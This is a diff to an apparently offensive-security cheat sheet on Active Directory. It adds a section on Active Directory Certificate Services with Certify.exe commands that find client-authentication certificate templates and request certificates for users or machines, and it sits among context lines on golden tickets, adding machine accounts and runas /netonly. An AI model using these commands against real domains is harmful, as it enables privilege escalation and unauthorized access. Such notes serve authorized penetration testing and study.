@@ -12,6 +12,7 @@
   * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
   * [msDS-AllowedToDelegateTo](#msDS-AllowedToDelegateTo)
 * [Computer Account](#Computer-Account)
+* [Active Directory Certificate Services](#Active-Directory-Certificate-Services)
 
 ## Golden ticket
 - https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets
@@ -324,4 +325,25 @@ New-MachineAccount -Domain <DOMAIN> -MachineAccount <NAME OF MACHINE TO ADD> -Do
 ### Runas computeraccount
 ```
 runas /netonly /user:<DOMAIN>\<COMPUTERACCOUNTNAME> powershell
+```
+
+## Active Directory Certificate Services
+#### Find certificated that permit client authentication
+- Important to look at:
+  - The validity period
+  - Authorization is not required.
+  - Who has enrollment rights.
+```
+.\Certify.exe find /clientauth
+```
+
+#### Request a certificate user
+- Uses the current user
+```
+.\Certify.exe request /ca:<CA NAME> /template:<TEMPLATE NAME>
+```
+
+#### Request a certificate machine
+```
+.\Certify.exe request /ca:<CA NAME> /template:<TEMPLATE NAME> /machine
 ```
